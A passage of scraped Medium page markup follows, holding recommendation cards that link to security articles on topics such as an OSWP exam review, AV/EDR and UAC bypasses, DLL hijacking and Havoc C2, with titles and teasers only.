class="fp wn aec ab q" tabindex="-1" rel="noopener follow" href="/delegation-1ff294e3defd?source=author_recirc-----75d231b2cac6----1---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"></a></div></div></div><div class="ab q aed aee"><div class=""><div><div class="bj" aria-hidden="false" aria-describedby="96" aria-labelledby="96"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F1ff294e3defd&amp;operation=register&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fdelegation-1ff294e3defd&amp;source=-----75d231b2cac6----1-----------------bookmark_preview----1947e925_9d52_4264_bbca_f325db8ba523-------" rel="noopener follow"><svg width="25" height="25" viewBox="0 0 25 25" fill="none" class="dr li aef" aria-label="Add to list bookmark button"><path d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18V2.5zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .8.4l5.7-4.4 5.7 4.4a.5.5 0 0 0 .8-.4v-8.5a.5.5 0 0 0-1 0v7.48l-5.2-4a.5.5 0 0 0-.6 0l-5.2 4V7z" fill="currentColor"></path></svg></a></span></div></div></div></div></div></span><div class="j i d"><div class="su be sv lg"></div></div></div></div></div></div></div></div></article></div></div><div class="zf zg zh zi zj zk zl zm zn zo zp zq ye zr zs zt yf zu zv zw zx"><div class="zy zz aba abb abc dt l"><article class="dt"><div class="dt rg l"><div class="be dt"><div class="dt l"><div class="fg dt abd abe abf abg abh abi abj abk abl abm abn abo abp" role="link" data-href="https://gustavshen.medium.com/my-experience-and-review-on-oswp-wifu-af9dd0f8cb8d" tabindex="0"><div class="abq"><div aria-label="My experience and review on OSWP/Wifu"><div class="abs abt abu abv abw"><img alt="My experience and review on OSWP/Wifu" class="be abx aby abz aca bu" src="https://miro.medium.com/v2/resize:fit:849/1*Vx4KmEx09Lz4rm-wpotYcA.png" loading="lazy"></div></div></div><div class="abr ab by cl"><div class="ab cl acb be acc acd ace acf"><div class="uo uq acg ach aci ab q"><div class="qs l"><div><div class="l" aria-hidden="false" aria-describedby="97" aria-labelledby="97"><a tabindex="-1" rel="noopener follow" href="/?source=author_recirc-----75d231b2cac6----2---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"><div class="l fg"><img alt="Gustav Shen" class="l fa bv acj ack cu" src="https://miro.medium.com/v2/resize:fill:25:25/1*QVBOkkcMPzE3HYxh1TH2Sg.jpeg" width="20" height="20" loading="lazy"><div class="fo bv l acj ack fp n av fq"></div></div></a></div></div></div><div class="acl l"><div><div class="l" aria-hidden="false" aria-describedby="98" aria-labelledby="98"><a class="af ag ah ai aj ak al am an ao ap aq ar in ab q" rel="noopener follow" href="/?source=author_recirc-----75d231b2cac6----2---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"><p class="bc b ds z acm acn aco acp acq acr acs act bh">Gustav Shen</p></a></div></div></div></div><div class="acu l acv acw acx acy acz gk"><div class="ada adb adc add ade adf adg adh"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/my-experience-and-review-on-oswp-wifu-af9dd0f8cb8d?source=author_recirc-----75d231b2cac6----2---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"><div title=""><h2 class="bc gs ml mn adi adj mo mp mr adk adl ms nr adm adn ado adp nv adq adr ads adt nz adu adv adw adx acm aco acp acr act bh">My experience and review on OSWP/Wifu</h2></div><div class="ady l"><h3 class="bc b il z acm adz aco acp aea acr act dr">Several days ago, I passed CompTIA Security+ exam and got my certification, then I planned the next one. At that time, I initially planned…</h3></div></a></div></div><span class="bc b ds z dr"><div class="ie ab cm ae"><div class="ab q"><span>Jun 19, 2021</span><div class=""><div class="fg aeb de ab q"><div class="fp lc aec ab q"><div class="au de dg l cu"></div></div><a class="fp wn aec ab q" tabindex="-1" rel="noopener follow" href="/my-experience-and-review-on-oswp-wifu-af9dd0f8cb8d?source=author_recirc-----75d231b2cac6----2---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"></a></div></div></div><div class="ab q aed aee"><div class=""><div><div class="bj" aria-hidden="false" aria-describedby="99" aria-labelledby="99"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Faf9dd0f8cb8d&amp;operation=register&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fmy-experience-and-review-on-oswp-wifu-af9dd0f8cb8d&amp;source=-----75d231b2cac6----2-----------------bookmark_preview----1947e925_9d52_4264_bbca_f325db8ba523-------" rel="noopener follow"><svg width="25" height="25" viewBox="0 0 25 25" fill="none" class="dr li aef" aria-label="Add to list bookmark button"><path d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18V2.5zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .8.4l5.7-4.4 5.7 4.4a.5.5 0 0 0 .8-.4v-8.5a.5.5 0 0 0-1 0v7.48l-5.2-4a.5.5 0 0 0-.6 0l-5.2 4V7z" fill="currentColor"></path></svg></a></span></div></div></div></div></div></span><div class="j i d"><div class="su be sv lg"></div></div></div></div></div></div></div></div></article></div></div><div class="zf zg zh zi zj zk zl zm zn zo zp zq ye zr zs zt yf zu zv zw zx"><div class="zy zz aba abb abc dt l"><article class="dt"><div class="dt rg l"><div class="be dt"><div class="dt l"><div class="fg dt abd abe abf abg abh abi abj abk abl abm abn abo abp" role="link" data-href="https://gustavshen.medium.com/walkthrough-of-my-vulnerable-ad-set-d56abeae5bac" tabindex="0"><div class="abq"><div aria-label="Walkthrough of My Vulnerable AD Set"><div class="abs abt abu abv abw"><img alt="Walkthrough of My Vulnerable AD Set" class="be abx aby abz aca bu" src="https://miro.medium.com/v2/resize:fit:849/1*AbILTYvX5RBfLSs6fl38tg.png" loading="lazy"></div></div></div><div class="abr ab by cl"><div class="ab cl acb be acc acd ace acf"><div class="uo uq acg ach aci ab q"><div class="qs l"><div><div class="l" aria-hidden="false" aria-describedby="100" aria-labelledby="100"><a tabindex="-1" rel="noopener follow" href="/?source=author_recirc-----75d231b2cac6----3---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"><div class="l fg"><img alt="Gustav Shen" class="l fa bv acj ack cu" src="https://miro.medium.com/v2/resize:fill:25:25/1*QVBOkkcMPzE3HYxh1TH2Sg.jpeg" width="20" height="20" loading="lazy"><div class="fo bv l acj ack fp n av fq"></div></div></a></div></div></div><div class="acl l"><div><div class="l" aria-hidden="false" aria-describedby="101" aria-labelledby="101"><a class="af ag ah ai aj ak al am an ao ap aq ar in ab q" rel="noopener follow" href="/?source=author_recirc-----75d231b2cac6----3---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"><p class="bc b ds z acm acn aco acp acq acr acs act bh">Gustav Shen</p></a></div></div></div></div><div class="acu l acv acw acx acy acz gk"><div class="ada adb adc add ade adf adg adh"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/walkthrough-of-my-vulnerable-ad-set-d56abeae5bac?source=author_recirc-----75d231b2cac6----3---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"><div title=""><h2 class="bc gs ml mn adi adj mo mp mr adk adl ms nr adm adn ado adp nv adq adr ads adt nz adu adv adw adx acm aco acp acr act bh">Walkthrough of My Vulnerable AD Set</h2></div><div class="ady l"><h3 class="bc b il z acm adz aco acp aea acr act dr">Hi guys, in previous days I designed and built a difficult and complex vulnerable AD set, I planned to post the guide to reproduce it…</h3></div></a></div></div><span class="bc b ds z dr"><div class="ie ab cm ae"><div class="ab q"><span>Jun 26, 2022</span><div class=""><div class="fg aeb de ab q"><div class="fp lc aec ab q"><div class="au de dg l cu"></div></div><a class="fp wn aec ab q" tabindex="-1" rel="noopener follow" href="/walkthrough-of-my-vulnerable-ad-set-d56abeae5bac?source=author_recirc-----75d231b2cac6----3---------------------1947e925_9d52_4264_bbca_f325db8ba523-------"></a></div></div></div><div class="ab q aed aee"><div class=""><div><div class="bj" aria-hidden="false" aria-describedby="102" aria-labelledby="102"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fd56abeae5bac&amp;operation=register&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fwalkthrough-of-my-vulnerable-ad-set-d56abeae5bac&amp;source=-----75d231b2cac6----3-----------------bookmark_preview----1947e925_9d52_4264_bbca_f325db8ba523-------" rel="noopener follow"><svg width="25" height="25" viewBox="0 0 25 25" fill="none" class="dr li aef" aria-label="Add to list bookmark button"><path d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18V2.5zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .8.4l5.7-4.4 5.7 4.4a.5.5 0 0 0 .8-.4v-8.5a.5.5 0 0 0-1 0v7.48l-5.2-4a.5.5 0 0 0-.6 0l-5.2 4V7z" fill="currentColor"></path></svg></a></span></div></div></div></div></div></span></div></div></div></div></div></div></article></div></div></div><div class="su be sv dh di aeg aeh aei"></div><div class="ab iv iw aej aek ael"><a class="bc b bd z bh qt aem aen aeo li le wf es et eu aep aeq aer ex vq vr aes aet aeu ey ez fa bj fb fc" rel="noopener follow" href="/?source=post_page-----75d231b2cac6--------------------------------"><div class="l fc">See all from Gustav Shen</div></a></div></div></div><div class="su be sv aev aew aex aey aez"></div><div class="ab by"><div class="cf be fw fx fy fz"><div class="afa afb l"><h2 class="bc sp ml mn mo mp mr ms mt mv mw mx mz na nb nd ne bh">Recommended from Medium</h2><div class="oh oi oj ok ol l"><div class="yp ab kg ix yq yr ys yt yu yv yw yx yy yz za zb zc zd ze"><div class="zf zg zh zi zj zk zl zm zn zo zp zq ye zr zs zt yf zu zv zw zx"><div class="zy zz aba abb abc dt l"><article class="dt"><div class="dt rg l"><div class="be dt"><div class="dt l"><div class="fg dt abd abe abf abg abh abi abj abk abl abm abn abo abp" role="link" data-href="https://medium.com/@n4d/interesting-av-edr-bypass-3ffa70fa338f" tabindex="0"><div class="abq"><div aria-label="Interesting AV/EDR bypass."><div class="abs abt abu abv abw"><img alt="Interesting AV/EDR bypass." class="be abx aby abz aca bu" src="https://miro.medium.com/v2/resize:fit:849/1*xSgIUBcfnQMrRt2cE1udRQ.png" loading="lazy"></div></div></div><div class="abr ab by cl"><div class="ab cl acb be acc acd ace acf"><div class="uo uq acg ach aci ab q"><div class="qs l"><div><div class="l" aria-hidden="false" aria-describedby="103" aria-labelledby="103"><a tabindex="-1" href="https://medium.com/@n4d?source=read_next_recirc-----75d231b2cac6----0---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><div class="l fg"><img alt="n4d" class="l fa bv acj ack cu" src="https://miro.medium.com/v2/resize:fill:25:25/1*6AN3wI37fGdDoaBIMYhpEw.png" width="20" height="20" loading="lazy"><div class="fo bv l acj ack fp n av fq"></div></div></a></div></div></div><div class="acl l"><div><div class="l" aria-hidden="false" aria-describedby="104" aria-labelledby="104"><a class="af ag ah ai aj ak al am an ao ap aq ar in ab q" href="https://medium.com/@n4d?source=read_next_recirc-----75d231b2cac6----0---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><p class="bc b ds z acm acn aco acp acq acr acs act bh">n4d</p></a></div></div></div></div><div class="acu l acv acw acx acy acz gk"><div class="ada adb adc add ade adf adg adh"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/@n4d/interesting-av-edr-bypass-3ffa70fa338f?source=read_next_recirc-----75d231b2cac6----0---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><div title=""><h2 class="bc gs ml mn adi adj mo mp mr adk adl ms nr adm adn ado adp nv adq adr ads adt nz adu adv adw adx acm aco acp acr act bh">Interesting AV/EDR bypass.</h2></div><div class="ady l"><h3 class="bc b il z acm adz aco acp aea acr act dr">Long story short: I pulled up a bunch of techniques and code together and it worked (again).&nbsp;:P</h3></div></a></div></div><span class="bc b ds z dr"><div class="ie ab cm ae"><div class="ab q"><span>Feb 20</span><div class=""><div class="fg aeb de ab q"><div class="fp lc aec ab q"><div class="au de dg l cu"></div></div><a class="fp wn aec ab q" tabindex="-1" href="https://medium.com/@n4d/interesting-av-edr-bypass-3ffa70fa338f?source=read_next_recirc-----75d231b2cac6----0---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"></a></div></div></div><div class="ab q aed aee"><div class=""><div><div class="bj" aria-hidden="false" aria-describedby="105" aria-labelledby="105"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F3ffa70fa338f&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40n4d%2Finteresting-av-edr-bypass-3ffa70fa338f&amp;source=-----75d231b2cac6----0-----------------bookmark_preview----9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><svg width="25" height="25" viewBox="0 0 25 25" fill="none" class="dr li aef" aria-label="Add to list bookmark button"><path d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18V2.5zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .8.4l5.7-4.4 5.7 4.4a.5.5 0 0 0 .8-.4v-8.5a.5.5 0 0 0-1 0v7.48l-5.2-4a.5.5 0 0 0-.6 0l-5.2 4V7z" fill="currentColor"></path></svg></a></span></div></div></div></div></div></span><div class="j i d"><div class="su be sv lg"></div></div></div></div></div></div></div></div></article></div></div><div class="zf zg zh zi zj zk zl zm zn zo zp zq ye zr zs zt yf zu zv zw zx"><div class="zy zz aba abb abc dt l"><article class="dt"><div class="dt rg l"><div class="be dt"><div class="dt l"><div class="fg dt abd abe abf abg abh abi abj abk abl abm abn abo abp" role="link" data-href="https://medium.com/@harikrishnanp006/uac-bypass-on-windows-abe21d74f050" tabindex="0"><div class="abq"><div aria-label="UAC Bypass On Windows"><div class="abs abt abu abv abw"><img alt="UAC Bypass On Windows" class="be abx aby abz aca bu" src="https://miro.medium.com/v2/resize:fit:849/1*dTPJZyFzrpObSrKlsXmsmg.png" loading="lazy"></div></div></div><div class="abr ab by cl"><div class="ab cl acb be acc acd ace acf"><div class="uo uq acg ach aci ab q"><div class="qs l"><div><div class="l" aria-hidden="false" aria-describedby="106" aria-labelledby="106"><a tabindex="-1" href="https://medium.com/@harikrishnanp006?source=read_next_recirc-----75d231b2cac6----1---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><div class="l fg"><img alt="Harikrishnan P" class="l fa bv acj ack cu" src="https://miro.medium.com/v2/resize:fill:25:25/0*owOOvOOb4Axrd5Md" width="20" height="20" loading="lazy"><div class="fo bv l acj ack fp n av fq"></div></div></a></div></div></div><div class="acl l"><div><div class="l" aria-hidden="false" aria-describedby="107" aria-labelledby="107"><a class="af ag ah ai aj ak al am an ao ap aq ar in ab q" href="https://medium.com/@harikrishnanp006?source=read_next_recirc-----75d231b2cac6----1---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><p class="bc b ds z acm acn aco acp acq acr acs act bh">Harikrishnan P</p></a></div></div></div></div><div class="acu l acv acw acx acy acz gk"><div class="ada adb adc add ade adf adg adh"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/@harikrishnanp006/uac-bypass-on-windows-abe21d74f050?source=read_next_recirc-----75d231b2cac6----1---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><div title=""><h2 class="bc gs ml mn adi adj mo mp mr adk adl ms nr adm adn ado adp nv adq adr ads adt nz adu adv adw adx acm aco acp acr act bh">UAC Bypass On Windows</h2></div><div class="ady l"><h3 class="bc b il z acm adz aco acp aea acr act dr">What is UAC?</h3></div></a></div></div><span class="bc b ds z dr"><div class="ie ab cm ae"><div class="ab q"><span>Dec 24, 2023</span><div class=""><div class="fg aeb de ab q"><div class="fp lc aec ab q"><div class="au de dg l cu"></div></div><a class="fp wn aec ab q" tabindex="-1" href="https://medium.com/@harikrishnanp006/uac-bypass-on-windows-abe21d74f050?source=read_next_recirc-----75d231b2cac6----1---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><div class="au l"><div><div class="ab" aria-hidden="false" aria-describedby="108" aria-labelledby="108"><div class="ab q fg"><svg width="16" height="16" viewBox="0 0 16 16" fill="#6B6B6B"><path d="M12.34 11.46A5.28 5.28 0 0 0 14 7.53C14 4.48 11.4 2 8.05 2 4.71 2 2 4.48 2 7.53c0 3.05 2.71 5.52 6.06 5.52.6 0 1.18-.08 1.76-.23.17.14.35.29.55.41.78.51 1.63.77 2.51.77.17 0 .3-.08.36-.22a.37.37 0 0 0-.03-.38 4.73 4.73 0 0 1-.86-1.96v.02z" fill="#6B6B6B"></path></svg><span style="margin-left: 4px;">2</span></div></div></div></div></a></div></div></div><div class="ab q aed aee"><div class=""><div><div class="bj" aria-hidden="false" aria-describedby="109" aria-labelledby="109"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fabe21d74f050&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40harikrishnanp006%2Fuac-bypass-on-windows-abe21d74f050&amp;source=-----75d231b2cac6----1-----------------bookmark_preview----9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><svg width="25" height="25" viewBox="0 0 25 25" fill="none" class="dr li aef" aria-label="Add to list bookmark button"><path d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18V2.5zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .8.4l5.7-4.4 5.7 4.4a.5.5 0 0 0 .8-.4v-8.5a.5.5 0 0 0-1 0v7.48l-5.2-4a.5.5 0 0 0-.6 0l-5.2 4V7z" fill="currentColor"></path></svg></a></span></div></div></div></div></div></span></div></div></div></div></div></div></article></div></div></div></div><div class="su be sv afc"></div><h2 class="bc sp il z gq bh">Lists</h2><div class="afd l"><div class="ck ab kg ix yq yr ys yt yu yv yw yx yy yz za zb zc zd ze"><div class="zf zg zh zi zj zk zl zm zn zo zp zq ye zr zs zt yf zu zv zw zx"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab ci ck" href="https://medium.com/@wearedelicious/list/tech-tools-541154dfb3ae?source=read_next_recirc-----75d231b2cac6--------------------------------" rel="noopener follow"><div class="afj afk acm ab iu fg"><div class="fg abx aff bu afg"><div class="abx ie acm l"><img alt="" class="" src="https://miro.medium.com/v2/resize:fill:60:60/1*VBGWIyCtkhx8FtMSb-xumg.png" width="48" height="48" loading="lazy" role="presentation"></div></div><div class="fg abx aff bu kh afh"><div class="abx ie acm l"><img alt="Close-up Shot of a Person Wearing a Robber Mask" class="" src="https://miro.medium.com/v2/resize:fill:60:60/1*UUb0HMDMuibZuDkkCazeJg.jpeg" width="48" height="48" loading="lazy"></div></div><div class="fg abx bu ri afi"><div class="abx ie acm l"><img alt="" class="" src="https://miro.medium.com/v2/resize:fill:60:60/1*x0FBZgsae1ElzECF0gNKgg.jpeg" width="48" height="48" loading="lazy" role="presentation"></div></div></div><div class="au l"><h2 class="bc sp il z acm adz aco acp aea acr act gq bh">Tech &amp; Tools</h2><div class="bc b ds z dr ab afe">17 stories<span class="io l" aria-hidden="true"><span class="bc b bd z dr">·</span></span>245 saves</div></div></a></div><div class="zf zg zh zi zj zk zl zm zn zo zp zq ye zr zs zt yf zu zv zw zx"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab ci ck" href="https://medium.com/@MediumStaff/list/mediums-huge-list-of-publications-accepting-submissions-7c0ec8037e61?source=read_next_recirc-----75d231b2cac6--------------------------------" rel="noopener follow"><div class="afj afk acm ab iu fg"><div class="fg abx aff bu afg"><div class="abx ie acm l"><img alt="" class="" src="https://miro.medium.com/v2/resize:fill:60:60/1*I-niCEZgF3IO-KGOMEuYkw.png" width="48" height="48" loading="lazy" role="presentation"></div></div><div class="fg abx aff bu kh afh"><div class="abx ie acm l"><img alt="" class="" src="https://miro.medium.com/v2/resize:fill:60:60/1*uPC1ZNHm3Zd1qREO8fVFjw.png" width="48" height="48" loading="lazy" role="presentation"></div></div><div class="fg abx bu ri afi"><div class="abx ie acm l"><img alt="" class="" src="https://miro.medium.com/v2/resize:fill:60:60/1*n1SHUUHyI16HZB1FhK8Khw.jpeg" width="48" height="48" loading="lazy" role="presentation"></div></div></div><div class="au l"><h2 class="bc sp il z acm adz aco acp aea acr act gq bh">Medium's Huge List of Publications Accepting Submissions</h2><div class="bc b ds z dr ab afe">312 stories<span class="io l" aria-hidden="true"><span class="bc b bd z dr">·</span></span>2901 saves</div></div></a></div><div class="zf zg zh zi zj zk zl zm zn zo zp zq ye zr zs zt yf zu zv zw zx"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab ci ck" href="https://medium.com/@MediumStaff/list/staff-picks-c7bc6e1ee00f?source=read_next_recirc-----75d231b2cac6--------------------------------" rel="noopener follow"><div class="afj afk acm ab iu fg"><div class="fg abx aff bu afg"><div class="abx ie acm l"><img alt="" class="" src="https://miro.medium.com/v2/resize:fill:60:60/1*c7CPwH-Dd-z-EuXCWt-nTQ.png" width="48" height="48" loading="lazy" role="presentation"></div></div><div class="fg abx aff bu kh afh"><div class="abx ie acm l"><img alt="" class="" src="https://miro.medium.com/v2/resize:fill:60:60/1*k5MtMpG6s7gg982F6PKUDA.jpeg" width="48" height="48" loading="lazy" role="presentation"></div></div><div class="fg abx bu ri afi"><div class="abx ie acm l"><img alt="" class="" src="https://miro.medium.com/v2/da:true/resize:fill:60:60/0*jVeDj5NiHn7uQS1B" width="48" height="48" loading="lazy" role="presentation"></div></div></div><div class="au l"><h2 class="bc sp il z acm adz aco acp aea acr act gq bh">Staff Picks</h2><div class="bc b ds z dr ab afe">662 stories<span class="io l" aria-hidden="true"><span class="bc b bd z dr">·</span></span>1054 saves</div></div></a></div><div class="zf zg zh zi zj zk zl zm zn zo zp zq ye zr zs zt yf zu zv zw zx"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab ci ck" href="https://medium.com/@AMGAS14/list/natural-language-processing-0a856388a93a?source=read_next_recirc-----75d231b2cac6--------------------------------" rel="noopener follow"><div class="afj afk acm ab iu fg"><div class="fg abx aff bu afg"><div class="abx ie acm l"><img alt="" class="" src="https://miro.medium.com/v2/resize:fill:60:60/1*TE_RI1h_vC18SZ7T8JZPYA.jpeg" width="48" height="48" loading="lazy" role="presentation"></div></div><div class="fg abx aff bu kh afh"><div class="abx ie acm l"><img alt="" class="" src="https://miro.medium.com/v2/da:true/resize:fill:60:60/0*g-WZmM7rB2vKABS0" width="48" height="48" loading="lazy" role="presentation"></div></div><div class="fg abx bu ri afi"><div class="abx ie acm l"><img alt="" class="" src="https://miro.medium.com/v2/resize:fill:60:60/1*dvYMmTYrhh_fAvhAaSuQhA.png" width="48" height="48" loading="lazy" role="presentation"></div></div></div><div class="au l"><h2 class="bc sp il z acm adz aco acp aea acr act gq bh">Natural Language Processing</h2><div class="bc b ds z dr ab afe">1510 stories<span class="io l" aria-hidden="true"><span class="bc b bd z dr">·</span></span>1034 saves</div></div></a></div></div></div><div class="su be sv afl dh afm di afn afo afp afq afr afs"></div><div class="yp ab kg ix yq yr ys yt yu yv yw yx yy yz za zb zc zd ze"><div class="zf zg zh zi zj zk zl zm zn zo zp zq ye zr zs zt yf zu zv zw zx"><div class="zy zz aba abb abc dt l"><article class="dt"><div class="dt rg l"><div class="be dt"><div class="dt l"><div class="fg dt abd abe abf abg abh abi abj abk abl abm abn abo abp" role="link" data-href="https://synexve.medium.com/dll-hijacking-leading-to-rce-remote-code-execution-de53eb3e9894" tabindex="0"><div class="abq"><div aria-label="DLL Hijacking leading to RCE(Remote Code Execution)"><div class="abs abt abu abv abw"><img alt="DLL Hijacking leading to RCE(Remote Code Execution)" class="be abx aby abz aca bu" src="https://miro.medium.com/v2/resize:fit:849/1*DiCnuLuzPVZE-YAuZOfprw.png" loading="lazy"></div></div></div><div class="abr ab by cl"><div class="ab cl acb be acc acd ace acf"><div class="uo uq acg ach aci ab q"><div class="qs l"><div><div class="l" aria-hidden="false" aria-describedby="110" aria-labelledby="110"><a tabindex="-1" href="https://synexve.medium.com/?source=read_next_recirc-----75d231b2cac6----0---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><div class="l fg"><img alt="Synex" class="l fa bv acj ack cu" src="https://miro.medium.com/v2/resize:fill:25:25/0*hv-mWVN4T-JQ_0tB.jpg" width="20" height="20" loading="lazy"><div class="fo bv l acj ack fp n av fq"></div></div></a></div></div></div><div class="acl l"><div><div class="l" aria-hidden="false" aria-describedby="111" aria-labelledby="111"><a class="af ag ah ai aj ak al am an ao ap aq ar in ab q" href="https://synexve.medium.com/?source=read_next_recirc-----75d231b2cac6----0---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><p class="bc b ds z acm acn aco acp acq acr acs act bh">Synex</p></a></div></div></div><div class="acl l"><p class="bc b ds z dr">in</p></div><div class="l"><div><div class="l" aria-hidden="false" aria-describedby="112" aria-labelledby="112"><a class="af ag ah ai aj ak al am an ao ap aq ar in ab q" href="https://medium.com/mii-cybersec?source=read_next_recirc-----75d231b2cac6----0---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><p class="bc b ds z acm acn aco acp acq acr acs act bh">MII Cyber Security Consulting Services</p></a></div></div></div></div><div class="acu l acv acw acx acy acz gk"><div class="ada adb adc add ade adf adg adh"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://synexve.medium.com/dll-hijacking-leading-to-rce-remote-code-execution-de53eb3e9894?source=read_next_recirc-----75d231b2cac6----0---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><div title=""><h2 class="bc gs ml mn adi adj mo mp mr adk adl ms nr adm adn ado adp nv adq adr ads adt nz adu adv adw adx acm aco acp acr act bh">DLL Hijacking leading to RCE(Remote Code Execution)</h2></div><div class="ady l"><h3 class="bc b il z acm adz aco acp aea acr act dr">Understanding DLL Hijacking</h3></div></a></div></div><span class="bc b ds z dr"><div class="ie ab cm ae"><div class="ab q"><span>Jan 26</span><div class=""><div class="fg aeb de ab q"><div class="fp lc aec ab q"><div class="au de dg l cu"></div></div><a class="fp wn aec ab q" tabindex="-1" href="https://synexve.medium.com/dll-hijacking-leading-to-rce-remote-code-execution-de53eb3e9894?source=read_next_recirc-----75d231b2cac6----0---------------------9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"></a></div></div></div><div class="ab q aed aee"><div class=""><div><div class="bj" aria-hidden="false" aria-describedby="113" aria-labelledby="113"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fde53eb3e9894&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fmii-cybersec%2Fdll-hijacking-leading-to-rce-remote-code-execution-de53eb3e9894&amp;source=-----75d231b2cac6----0-----------------bookmark_preview----9bf3f591_a556_43c2_b238_8007baacaee5-------" rel="noopener follow"><svg width="25" height="25" viewBox="0 0 25 25" fill="none" class="dr li aef" aria-label="Add to list bookmark button"><path d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18V2.5zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .8.4l5.7-4.4 5.7 4.4a.5.5 0 0 0 .8-.4v-8.5a.5.5 0 0 0-1 0v7.48l-5.2-4a.5.5 0 0 0-.6 0l-5.2 4V7z" fill="currentColor"></path></svg></a></span></div></div></div></div></div></span><div class="j i d"><div class="su be sv lg"></div></div></div></div></div></div></div></div></article></div></div><div class="zf zg zh zi zj zk zl zm zn zo zp zq ye zr zs zt yf zu zv zw zx"><div class="zy zz aba abb abc dt l"><article class="dt"><div class="dt rg l"><div class="be dt"><div class="dt l"><div class="fg dt abd abe abf abg abh abi abj abk abl abm abn abo abp" role="link" data-href="https://medium.com/@manan07/microsoft-devtunnel-with-havoc-c2-f72de5fcd9ba" tabindex="0"><div class="abq"><div aria-label="Microsoft Devtunnel with Havoc C2"><div class="abs abt abu abv abw"><img alt="Microsoft Devtunnel with Havoc C2" class="be abx aby abz aca bu" src="https://miro.medium.com/v2/resize:fit:849/1*l_PhczXBbjONj20D0Ao1kg.png" loading="lazy"></div></div></div><div class="abr ab by cl"><div class="ab cl acb be acc acd ace acf"><div class="uo uq 